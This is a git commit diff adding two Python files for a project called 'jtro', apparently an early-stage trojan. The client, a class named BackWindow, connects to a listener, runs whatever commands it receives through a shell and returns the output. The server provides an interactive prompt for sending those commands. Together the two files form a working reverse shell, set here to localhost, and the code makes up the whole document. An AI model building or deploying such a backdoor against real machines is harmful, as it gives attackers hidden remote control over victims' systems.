f3cfdfb15e0bfa098a26be4558e1adb906b02d46
Abdullah Al Mohin Jaki <me.jaki@outlook.com>
2019-04-19 08:51:06 +0600

    jtro client and server connection established

--- client.py
+++ client.py
@@ -1,1 +1,24 @@
-#!/usr/bin/python3
+#!usr/bin/python3
+import socket
+import subprocess
+
+
+class BackWindow:
+    def __init__(self, host, port):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+        self.sock.connect((host, port))
+
+    def execute(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            command = self.sock.recv(1024)
+            cmd_result = self.execute(command)
+            self.sock.send(cmd_result)
+
+        sock.close()
+
+
+jtro_window = BackWindow('127.0.0.1', 4545)
+jtro_window.run()
--- server.py
+++ server.py
@@ -1,1 +1,27 @@
-#!usr/bin/python3
+# !/usr/bin/python3
+import socket
+
+
+class Listener:
+    def __init__(self, host, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((host, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connection.")
+        self.conn, address = listener.accept()
+        print("[+] Got a connection from " + str(address))
+
+    def execute(self, command):
+        self.conn.send(command.encode('ascii'))
+        return self.conn.recv(1024)
+
+    def run(self):
+        while True:
+            command = input('jTro~$')
+            result = self.execute(command)
+            print(result)
+
+
+jtro_listener = Listener('127.0.0.1', 4545)
+jtro_listener.run()
